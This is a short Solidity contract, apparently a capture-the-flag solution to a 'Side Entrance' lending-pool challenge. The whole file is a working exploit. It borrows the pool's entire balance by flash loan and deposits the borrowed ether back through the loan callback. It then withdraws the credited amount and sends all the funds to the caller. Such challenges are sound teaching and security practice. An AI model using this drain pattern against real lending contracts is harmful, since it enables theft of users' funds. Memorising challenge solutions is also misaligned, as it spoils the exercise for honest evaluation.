// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract attackSideEntrance {
    SideEntranceLenderPool public sideEntranceLenderPool;

    constructor(address _pool) {
        sideEntranceLenderPool = SideEntranceLenderPool(_pool);
    }

    function attack() public payable {
        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
        sideEntranceLenderPool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() public payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
